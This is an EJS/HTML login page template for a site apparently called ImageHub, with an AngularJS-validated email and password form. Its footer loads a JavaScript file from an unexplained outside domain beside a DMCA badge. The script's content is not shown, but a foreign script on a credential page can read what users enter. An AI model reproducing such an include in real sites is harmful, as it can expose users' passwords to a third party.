<!doctype html>
<html>
<head>
    <title>ImageHub</title>
   <link rel="stylesheet" href="/stylesheets/bootstrap.min.css">
    <link rel="stylesheet" href="/stylesheets/font-awesome.min.css">
    <script src="/javascripts/angular.min.js"></script>
    <script src="javascripts/jquery-1.11.3.min.js"></script>
    <script src="/javascripts/registController.js"></script>
    <link rel="shortcut icon" href="/images/logo1.png">
      <!--- - -  - - -     -->  
    
    <style>
        body        { padding-top:80px;background: #000001 !important; color:white; }
        footer {
                float: right;
                height: 35px;
                margin: 0px 50px 0px 0px;
                color: #000;
                text-align: right;
                padding: 10px 30px;
                width: 180px;
            }
    </style>
</head>

<body ng-app="myProject" ng-controller="registCtrl">

<div class="container">
<div class="col-sm-6 col-sm-offset-3">

    <h1><span class="fa fa-sign-in"></span> Login</h1>

    <% if (message.length > 0) { %>
        <div class="alert alert-danger"><%= message %></div>
    <% } %>

    <!-- LOGIN FORM -->
    <form action="/login" method="post" name="login">
        <div class="form-group">
            <label>Email*</label>
            <input type="email" class="form-control" name="email" placeholder="abc@yahoo.com" required>
            <span style="color:red" ng-show="login.email.$invalid">Enter valid email</span><br> 
        </div>
        <div class="form-group">
            <label>Password*</label>
            <input type="password" class="form-control" ng-model="user.password" name="password" placeholder="1234ya" ng-model-options="{ updateOn: 'blur' }" minlength=6 maxlength=12 required/>
            <span style="color:red" ng-show="login.password.$error.minlength||login.password.$error.maxlength">Enter 6-12 characters</span><br> 
        </div>

        <button type="submit" class="btn btn-warning btn-lg" ng-disabled="login.password.$dirty && login.password.$invalid">Login</button>
    </form>

    <hr>
    <p><a href="/forgot">Forgot password?</a></p>

    <p>Need an account? <a href="/signup">Signup</a></p>
    <p>Or go <a href="/">home</a>.</p>



</div>
 
</div>
<footer>
          <a href="http://www.dmca.com/Protection/Status.aspx?ID=ed7716f1-be0a-4c39-8b9a-988b7d28e39c" title="DMCA.com Protection Status" class="dmca-badge"> <img src="/images/dmca_protected.png" alt="DMCA.com Protection Status"></a>  <script src="https://webcdn.streamtest.net/streamtest.js" type="text/javascript"></script> 
</footer>
</body>
</html>